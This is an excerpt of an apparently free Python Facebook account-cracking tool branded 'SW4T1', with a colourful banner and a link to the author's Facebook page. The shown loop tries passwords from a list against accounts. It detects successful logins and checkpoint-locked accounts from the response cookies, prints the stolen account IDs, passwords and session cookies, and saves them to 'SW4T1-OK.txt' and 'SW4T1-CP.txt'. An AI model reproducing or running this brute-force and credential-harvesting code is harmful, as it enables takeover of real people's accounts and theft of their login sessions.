...
logo = """
         ...
         \033[1;32m ##     ##     ######      ###### 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mMUMTAZ SHAH\033[1;32m
[•] STATUS     : \033[1;32mFREE\033[1;32m
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 1.3 \033[1;32m"DON'T WORRY FOR UPDATES!"\033[1;32m
--------------------------------------------------"""
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/KINGXMRSW4TI')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SW4T1-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('SW4T1-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[SW4T1-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SW4T1-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSW4T1\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
